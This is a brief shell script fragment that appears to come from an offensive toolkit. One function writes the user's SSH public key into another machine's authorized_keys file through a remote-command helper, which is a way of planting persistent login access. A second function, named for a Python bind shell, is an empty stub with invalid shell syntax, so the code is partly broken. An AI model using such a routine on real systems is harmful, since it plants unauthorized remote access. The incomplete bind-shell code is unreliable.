function authorize_my_pubkey() {
    pubkey=`cat ~/.ssh/id_rsa.pub | cut -d' ' -f1,2`
    tmrun_sh "mkdir ~/.ssh"
    tmrun_sh "echo $pubkey > .ssh/authorized_keys"
}

function py_bindshell() {
    $port = $1
    bindshell_data = 
}
